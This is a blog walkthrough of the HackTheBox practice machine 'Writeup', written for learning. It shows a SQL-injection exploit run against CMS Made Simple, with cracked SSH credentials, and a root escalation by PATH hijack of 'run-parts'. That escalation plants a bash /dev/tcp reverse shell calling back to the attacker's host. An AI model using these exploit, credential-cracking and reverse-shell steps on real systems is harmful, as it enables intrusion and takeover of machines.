---
layout: post
title: Hackthebox Writeup Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-10-12/writeup-badge.png)
# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
To learn a new technique/knowledge, solve all machines (As much as possible!!).<br>
This is a walkthrough of a box "Writeup".<br>

# Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.138 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-02 15:17 EEST
Nmap scan report for 10.10.10.138
Host is up (0.039s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.42 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.138/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.138/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/10/04 16:57:01 Starting gobuster
===============================================================
[ERROR] 2019/10/04 16:57:07 [!] Get http://10.10.10.138/5: dial tcp 10.10.10.138:80: connect: connection refused
[ERROR] 2019/10/04 16:57:09 [!] Get http://10.10.10.138/6: dial tcp 10.10.10.138:80: connect: connection refused
Progress: 107 / 220561 (0.05%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2019/10/04 16:57:10 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

Sounds like we can't use gobuster for this box.<br>
At first, try to look at the web page.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-10-12/2019-10-10-15-54-20.png)

There was nothing here. Next, look at the path which is specified in "http-robots.txt"<br>
We can find a web page which "<a href="https://www.cmsmadesimple.org/">CMS Made Simple</a>" is used.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-10-12/2019-10-10-15-54-58.png)
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-10-12/2019-10-10-15-55-20.png)

In the download page of CMS Made Simple, we can find a link which we can see the content of the package.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-10-12/2019-10-12-19-12-34.png)
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-10-12/2019-10-12-19-13-04.png)

In the directory "/trunk/doc", we can find "CHANGELOG.txt".
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-10-12/2019-10-12-19-30-06.png)

By accessing the "CHANGELOG.txt" on Writeup, we can figure out the version of CMS Made Simple is "2.2.9.1"
{% highlight shell %}
root@kali:~# curl http://10.10.10.138/writeup/doc/CHANGELOG.txt 
Version 2.2.9.1
-------------------------------
Core - General
  - fix to the CmsLayoutStylesheetQuery class
  - fix an edge case in the Database\Connection::DbTimeStamp() method

MicroTiny v2.2.4
  - Minor fix in error displays.

Phar Installer v1.3.7
  - Fix to edge case in step 3 where memory_limit is set to -1

Version 2.2.9 - Blow Me Down

~~~

{% endhighlight %}

Then, look for the exploit.<br>
We have bunch of them but we have exploit for close version <a href="https://www.exploit-db.com/exploits/46635">CMS Made Simple &gt; 2.2.10 - SQL Injection</a>.
{% highlight shell %}
root@kali:~# searchsploit CMS made simple
------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                       |  Path
                                                                                     | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------- ----------------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)   | exploits/php/remote/46627.rb
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                              | exploits/php/webapps/26217.html
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                              | exploits/php/webapps/26298.txt
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                           | exploits/php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                               | exploits/php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities              | exploits/php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                    | exploits/php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                          | exploits/php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                 | exploits/php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                     | exploits/php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                         | exploits/php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                        | exploits/php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                  | exploits/php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                     | exploits/php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                     | exploits/php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                        | exploits/php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery              | exploits/php/webapps/34068.html
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                     | exploits/php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                        | exploits/php/webapps/44192.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                        | exploits/php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                        | exploits/php/webapps/45793.py
CMS Made Simple &gt; 1.12.1 / &gt; 2.1.3 - Web Server Cache Poisoning                | exploits/php/webapps/39760.txt
CMS Made Simple &gt; 2.2.10 - SQL Injection                                          | exploits/php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                     | exploits/php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                | exploits/php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload       | exploits/php/webapps/46546.py
------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

Try to run the script to crack the password.<br>
By adding "--crack" and "-w wordlist", we can get the password hash and crack it.
{% highlight shell %}
root@kali:~# python 46635.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
{% endhighlight %}

Now, we had following credential.
{% highlight shell %}
jkr:raykayjay9
{% endhighlight %}

By accessing via SSH, we can obtain a user shell as "jtk".
{% highlight shell %}
root@kali:~# ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
{% endhighlight %}

user.txt is in a directory "/home/jkr"
{% highlight shell %}
jkr@writeup:~$ pwd
/home/jkr

jkr@writeup:~$ cat user.txt 
d4e493fd4068afc9eb1aa6a55319f978
{% endhighlight %}

### 3. Getting Root

By running <a href="https://github.com/DominicBreuker/pspy">pspy</a> and login with another windows, we can find that When someone login, following command runs.
{% highlight shell %}
2019/10/02 12:49:04 CMD: UID=0    PID=5837   | sshd: [accepted]
2019/10/02 12:49:04 CMD: UID=0    PID=5838   | sshd: [accepted]  
2019/10/02 12:49:08 CMD: UID=0    PID=5839   | sshd: jkr [priv]  
2019/10/02 12:49:08 CMD: UID=0    PID=5840   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/10/02 12:49:09 CMD: UID=0    PID=5841   | run-parts --lsbsysinit /etc/update-motd.d 
2019/10/02 12:49:09 CMD: UID=0    PID=5842   | /bin/sh /etc/update-motd.d/10-uname 
2019/10/02 12:49:09 CMD: UID=0    PID=5843   | sshd: jkr [priv]  
{% endhighlight %}

In following command, only 'run-parts' is using relative path.<br>
We can take advantage of this.<br>
{% highlight shell %}
2019/10/02 12:49:09 CMD: UID=0    PID=5841   | run-parts --lsbsysinit /etc/update-motd.d 
{% endhighlight %}

On this server, we have "run-parts" in "/bin".
{% highlight shell %}
jkr@writeup:~$ which run-parts
/bin/run-parts
{% endhighlight %}

However, we have several directories in the PATH before "/bin" which is writable for users.
{% highlight shell %}
jkr@writeup:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

jkr@writeup:~$ ls -l /usr/local/ | grep bin
drwx-wsr-x 2 root staff 20480 Apr 19 04:11 bin
drwx-wsr-x 2 root staff 12288 Apr 19 04:11 sbin
{% endhighlight %}

Then, create a reverse shell executable with the name "run-parts" in "/usr/local/sbin".
{% highlight shell %}
jkr@writeup:~$ echo "#! /bin/bash" > /usr/local/bin/run-parts

jkr@writeup:~$ echo "bash -i >& /dev/tcp/10.10.14.30/443 0>&1" >> /usr/local/bin/run-parts

jkr@writeup:~$ chmod +x /usr/local/bin/run-parts

jkr@writeup:~$ cat /usr/local/bin/run-parts
#! /bin/bash
bash -i >& /dev/tcp/10.10.14.30/443 0>&1
{% endhighlight %}

After that, launch the netcat listener and login to Writeup with SSH as jkr user.<br>
We can get a reverse shell as a root user.
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.138] 50656
bash: cannot set terminal process group (2460): Inappropriate ioctl for device
bash: no job control in this shell
root@writeup:/# id
id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

As usual, root.txt is in the directory "/root"
{% highlight shell %}
root@writeup:/root# cat root.txt
cat root.txt
eeba47f60b48ef92b734f9b6198d7226
{% endhighlight %}
